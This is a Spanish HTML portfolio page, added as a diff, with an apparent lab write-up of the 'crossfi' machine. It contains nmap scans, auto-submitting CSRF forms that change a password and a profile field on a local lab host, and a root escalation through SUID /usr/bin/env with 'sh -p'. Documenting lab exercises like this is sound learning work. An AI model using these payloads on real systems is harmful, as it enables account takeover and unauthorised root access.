@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crossfi</title>
+    <link href="../style/estilo.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeup.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <h1 class="text-4xl font-bold mb-2">🔹Máquina: crossfi</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el <!-- TODO: fecha --> | Categoría: WEB / CSRF </p>
+
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Laboratorio de dificultad media enfocado en explotar Cross-Site Request Forgery (CSRF)
+            en dos niveles distintos: primero en la funcionalidad de cambio de contraseña, y luego
+            en un formulario con múltiples campos donde solo uno carece de protección CSRF.
+            El objetivo es escalar desde el registro inicial hasta obtener una shell como root.
+        </p>
+    </section>
+
+    <!----------------- Análisis ----------------------->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            Escaneo de puertos completo, seguido de un escaneo de versión sobre los puertos abiertos:
+        </p>
+        <pre><code class="language-bash">
+sudo nmap -p- -open -sS --min-rate 5000 -n -Pn 172.17.0.2
+sudo nmap -p22,5000 -sCV --min-rate 5000 172.17.0.2
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
+5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.13.5)
+|_http-title: Laboratorio CSRF
+|_Requested resource was /login
+|_http-server-header: Werkzeug/3.1.3 Python/3.13.5
+MAC Address: C2:A1:19:A7:70:25 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            Aplicación Flask/Werkzeug en el puerto 5000. Se registró un usuario y se accedió al
+            panel de control, que ofrecía un formulario de cambio de contraseña con la siguiente
+            pista:
+        </p>
+        <blockquote class="border-l-4 border-yellow-500 pl-4 text-gray-300 italic mb-4">
+            "Este formulario es vulnerable a CSRF. ¡Intenta cambiar la contraseña desde una fuente externa!"
+        </blockquote>
+        <img src="../Assets/crossfi/2-panel-control.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="panel de control con pista CSRF">
+    </section>
+
+    <!-- Explotación -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Explotación</h2>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">Nivel 1 — CSRF en cambio de contraseña</h3>
+        <p class="text-gray-300 mb-4">
+            Se capturó con Burp la petición de cambio de contraseña para entender su estructura:
+        </p>
+        <pre><code class="language-http">
+POST /change-password HTTP/1.1
+Host: 172.17.0.2:5000
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=eyJ1c2VyX2lk...
+
+new_password=1234
+        </code></pre>
+        <img src="../Assets/crossfi/3-request-burp.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="petición de cambio de contraseña capturada">
+
+        <p class="text-gray-300 mt-4">
+            El endpoint no exige ningún token CSRF junto al parámetro <code>new_password</code>: solo
+            depende de la cookie de sesión, que el navegador adjunta automáticamente en cualquier
+            request al dominio, sin importar el origen desde el que salió. Eso es exactamente lo que
+            permite forjar la petición desde un sitio externo. Se armó un HTML malicioso que se
+            autoenvía al cargar:
+        </p>
+        <pre><code class="language-html">
+&lt;html&gt;
+  &lt;body onload="document.forms[0].submit()"&gt;
+    &lt;form action="http://172.17.0.2:5000/change-password" method="POST"&gt;
+      &lt;input type="hidden" name="new_password" value="1234"&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            Servido desde un origen distinto (<code>python3 -m http.server 8000</code>) para simular
+            un sitio externo real. Con la sesión de la víctima activa en el navegador, al visitar ese
+            HTML el formulario se envía solo y la contraseña cambia sin interacción del usuario.
+        </p>
+        <img src="../Assets/crossfi/4-csrf-nivel1-exitoso.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="CSRF nivel 1 explotado">
+        <p class="text-gray-300 mt-4">
+            El laboratorio entregó credenciales para el siguiente nivel:
+        </p>
+        <pre><code class="language-text">
+Usuario: pinguinito
+Password: pinguinitojeje
+        </code></pre>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">Nivel 2 — CSRF en campo sin protección</h3>
+        <p class="text-gray-300 mb-4">
+            El segundo nivel (<code>/csrf-level2</code>) presenta un formulario de perfil con varios
+            campos actualizables de forma independiente (Nombre Completo, Edad, Biografía, entre
+            otros), todos protegidos con token CSRF salvo uno. El objetivo es identificar cuál.
+        </p>
+        <p class="text-gray-300 mb-4">
+            Se interceptó cada actualización de campo con Burp y se comparó el body de cada request.
+            Los campos protegidos incluían un parámetro <code>csrf_token</code>; la petición de
+            <code>/update-biografia</code> no lo llevaba:
+        </p>
+        <pre><code class="language-http">
+POST /update-biografia HTTP/1.1
+Host: 172.17.0.2:5000
+Content-Type: application/x-www-form-urlencoded
+Authorization: Basic cGluZ3VpbmlObzpwaW5ndWluaXRvamVqZQ==
+Cookie: session=eyJ1c2VyX2lk...
+
+biografia=un+nazi
+        </code></pre>
+        <img src="../Assets/crossfi/4-request-biografia.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="petición de biografía sin csrf_token">
+
+        <p class="text-gray-300 mt-4">
+            <!-- TODO: confirmar y documentar qué contenía el header Authorization Basic decodificado -->
+            Se aplicó el mismo patrón de explotación que en el nivel 1, apuntando al endpoint
+            específico:
+        </p>
+        <pre><code class="language-html">
+&lt;html&gt;
+  &lt;body onload="document.forms[0].submit()"&gt;
+    &lt;form action="http://172.17.0.2:5000/update-biografia" method="POST"&gt;
+      &lt;input type="hidden" name="biografia" value="pwned via csrf"&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            Con la sesión de <code>pinguinito</code> activa, al visitar el HTML el campo biografía
+            cambió sin interacción manual, confirmando la ausencia de validación CSRF en ese endpoint
+            en particular:
+        </p>
+        <img src="../Assets/crossfi/5-csrf-nivel2-exitoso.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="CSRF nivel 2 explotado">
+        <p class="text-gray-300 mt-4">
+            El laboratorio entregó credenciales de acceso SSH:
+        </p>
+        <pre><code class="language-text">
+Usuario: balulero
+Password: balulei
+        </code></pre>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">Escalada de privilegios — SUID en /usr/bin/env</h3>
+        <p class="text-gray-300 mb-4">
+            Ya con shell como <code>balulero</code> vía SSH, se descartó sudo (sin permisos) y se
+            buscaron binarios con bit SUID:
+        </p>
+        <pre><code class="language-bash">
+balulero@3f596e22962b:~$ sudo -l
+Sorry, user balulero may not run sudo on 3f596e22962b.
+
+balulero@3f596e22962b:~$ find / -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/env
+/usr/bin/chsh
+/usr/bin/sudo
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            De toda la lista, la mayoría son SUID estándar de cualquier instalación Debian/Kali
+            (<code>passwd</code>, <code>su</code>, <code>mount</code>, etc.). La anomalía es
+            <code>/usr/bin/env</code>: por defecto no lleva SUID, así que su presencia ahí es una
+            mala configuración deliberada. Es explotación directa, documentada en GTFOBins:
+        </p>
+        <pre><code class="language-bash">
+balulero@3f596e22962b:~$ /usr/bin/env /bin/sh -p
+# id
+uid=1000(balulero) gid=1000(balulero) euid=0(root) groups=1000(balulero)
+# whoami
+root
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            El flag <code>-p</code> evita que la shell purgue los privilegios efectivos al detectar
+            que UID real y efectivo no coinciden, permitiendo mantener <code>euid=0</code>.
+        </p>
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            Se obtuvo acceso root confirmado con <code>whoami</code>, encadenando dos niveles de CSRF
+            (ausencia total de token en el cambio de contraseña, y un campo específico sin protección
+            entre varios protegidos) con una escalada de privilegios por un binario SUID mal
+            configurado (<code>/usr/bin/env</code>). No se encontró flag en el sistema.
+        </p>
+    </section>
+
+    <div class="mt-10">
+        <a href="../writeup.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
